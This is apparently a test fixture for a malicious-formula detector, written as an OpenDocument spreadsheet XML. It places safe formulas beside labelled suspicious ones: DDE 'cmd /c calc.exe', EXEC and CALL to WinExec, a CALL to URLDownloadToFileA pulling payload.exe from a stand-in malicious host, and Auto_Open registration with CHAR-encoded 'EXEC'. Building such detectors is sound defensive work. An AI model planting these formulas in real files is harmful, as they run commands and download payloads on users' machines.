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of="urn:oasis:names:tc:opendocument:xmlns:of:1.2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of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" office:version="1.2">
  <office:automatic-styles/>
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Test Sheet">
        <table:table-row>
          <table:table-cell>
            <text:p>Safe Formula</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=SUM(B1:B10)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=AVERAGE(C1:C5)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=IF(D1&gt;10,&quot;Yes&quot;,&quot;No&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell>
            <text:p/>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell>
            <text:p>Suspicious Formulas</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=HYPERLINK(&quot;http://example.com&quot;,&quot;Click here&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=WEBSERVICE(&quot;http://api.example.com/data&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=INDIRECT(&quot;A1&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell>
            <text:p/>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell>
            <text:p>Suspicious VBA-Related</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=cmd|&quot;/c calc.exe&quot;!A1" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=EXEC(&quot;calc.exe&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=CALL(&quot;kernel32&quot;,&quot;WinExec&quot;,&quot;JJJ&quot;,&quot;calc.exe&quot;,1)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=PERSONAL.XLSB!MyMacro()" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=REGISTER(&quot;user32&quot;,&quot;MessageBoxA&quot;,&quot;JJCCJ&quot;,&quot;MessageBox&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=FILES(&quot;C:\*.*&quot;)" office:value-type="string"/>
        </table:table-row>
      </table:table>
      <table:table table:name="Sheet2">
        <table:table-row>
          <table:table-cell>
            <text:p>Another Sheet</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=FILTERXML(WEBSERVICE(&quot;http://example.com/xml&quot;),&quot;//data&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell>
            <text:p/>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell>
            <text:p>More Suspicious Content</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCJJ&quot;,0,&quot;http://malicious.com/payload.exe&quot;,&quot;C:\temp\payload.exe&quot;,0,0)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=REGISTER.ID(&quot;Auto_Open&quot;)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=GET.WORKSPACE(1)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=ALERT(&quot;This is a macro&quot;,2)" office:value-type="string"/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:formula="of:=CHAR(69)&amp;CHAR(88)&amp;CHAR(69)&amp;CHAR(67)"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of="urn:oasis:names:tc:opendocument:xmlns:of:1.2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of="urn:oasis:names:tc:opendocument:xmlns:of:1.2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